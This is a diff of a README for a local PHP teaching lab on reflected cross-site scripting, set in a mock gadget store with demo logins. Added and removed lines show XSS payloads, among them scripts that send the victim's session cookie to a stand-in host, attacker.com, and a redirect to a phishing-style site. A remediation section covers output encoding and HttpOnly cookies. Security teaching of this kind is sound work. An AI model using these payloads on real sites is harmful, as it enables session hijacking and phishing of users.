@@ -1,66 +1,79 @@
 # Reflected XSS Demo Lab - Gadget Store
 
-This project is a simple PHP-based demo website designed to demonstrate a **Reflected Cross-Site Scripting (XSS)** vulnerability for educational purposes.
+This lab demonstrates practical **Reflected Cross-Site Scripting (XSS)** attacks, including session hijacking.
 
 ## Project Structure
-- `index.php`: The homepage with a search bar.
-- `search.php`: The search results page where the vulnerability exists.
-- `style.css`: Basic styling for the website.
-- `script.js`: Simple client-side scripts.
+- `db.php`: SQLite database initialization.
+- `login.php`: User authentication.
+- `index.php`: Store homepage with product search.
+- `search.php`: Search results (Vulnerable Point A).
+- `profile.php`: User profile (Vulnerable Point B).
+- `logout.php`: Session termination.
+- `database.db`: SQLite database file.
 
-## How it Works
-The Gadget Store allows users to search for products using a search bar. When a user submits a search query, they are redirected to `search.php?query=...`, where the results are displayed.
+## Lab Setup
+Run the built-in PHP server:
+```bash
+php -S localhost:8000
+```
 
-## The Vulnerability: Reflected XSS
-Reflected XSS occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
+### Credentials
+- **Admin**: `admin` / `admin123`
+- **User**: `victim` / `password123`
 
-### Where it Happens
-In `search.php`, the search query is retrieved from the `$_GET['query']` parameter and reflected directly into the HTML without any sanitization or encoding:
+## Attack Scenarios
 
+### 1. Basic Reflected XSS (Visual Evidence)
+- **Vulnerable URL**: `http://localhost:8000/search.php?query=`
+- **Payload**: `<script>alert('XSS')</script>`
+- **Explanation**: The search term is directly reflected into the `<h2>` tag in `search.php`.
+
+### 2. Session Hijacking (The "Practical" Attack)
+This attack aims to steal the `PHPSESSID` cookie.
+
+- **Vulnerable URL**: `http://localhost:8000/profile.php?msg=`
+- **Scenario**: An attacker sends a link to a logged-in victim.
+- **Payload (Conceptual)**:
+  ```html
+  <script>document.location='http://attacker.com/steal?cookie=' + document.cookie</script>
+  ```
+- **Local Simulation**:
+  ```html
+  <script>alert('Stealing Cookie: ' + document.cookie)</script>
+  ```
+- **Execution**: Log in as `victim`, then navigate to:
+  `http://localhost:8000/profile.php?msg=<script>alert('Cookie: '+document.cookie)</script>`
+
+### 3. DOM Redirection
+- **Payload**: `<script>window.location='https://malicious-site.com'</script>`
+- **Explanation**: Redirects the user to a phishing page.
+
+## Remediation
+
+### Code-Level Fix (PHP)
+Use `htmlspecialchars()` to encode special characters.
+
+**Before (Vulnerable):**
 ```php
-<!-- VULNERABLE POINT: The search query is reflected directly back without sanitization -->
 <h2>Search results for: <?php echo $query; ?></h2>
 ```
 
-### How to Exploit It
-An attacker can craft a malicious URL that includes a script in the `query` parameter. When a victim clicks on this URL, the script will execute in their browser context.
-
-**Example Payloads:**
-
-1.  **Simple Alert:**
-    ```text
-    http://localhost:8000/search.php?query=<script>alert('XSS!')</script>
-    ```
-
-2.  **Stealing Cookies (Conceptual):**
-    ```text
-    http://localhost:8000/search.php?query=<script>fetch('https://attacker.com/log?cookie=' + document.cookie)</script>
-    ```
-
-3.  **Modifying the DOM:**
-    ```text
-    http://localhost:8000/search.php?query=<img src=x onerror=alert('Image_XSS')>
-    ```
-
-## Running the Lab
-Since this is a pure PHP project, you can run it using the built-in PHP development server:
-
-1.  Open your terminal in the project directory.
-2.  Run the following command:
-    ```bash
-    php -S localhost:8000
-    ```
-3.  Open your browser and navigate to `http://localhost:8000`.
-
-## How to Fix It
-To prevent Reflected XSS, all user-provided data must be properly sanitized or encoded before being rendered in the browser. In PHP, you should use `htmlspecialchars()`:
-
-**Corrected Code:**
+**After (Secure):**
 ```php
 <h2>Search results for: <?php echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8'); ?></h2>
 ```
 
-By using `htmlspecialchars`, special characters like `<` and `>` are converted to their HTML entity equivalents (`&lt;` and `&gt;`), preventing the browser from interpreting them as tags.
+### Server-Level Fix
+Set the `HttpOnly` flag on cookies to prevent JavaScript from accessing them.
+
+**PHP Configuration:**
+```php
+session_start([
+    'cookie_httponly' => true,
+    'cookie_secure' => true, // Use with HTTPS
+    'cookie_samesite' => 'Strict',
+]);
+```
 
 ---
-**Disclaimer:** This lab is for educational purposes only. Never use these techniques on websites you do not have permission to test.
+**Disclaimer**: For educational use only.
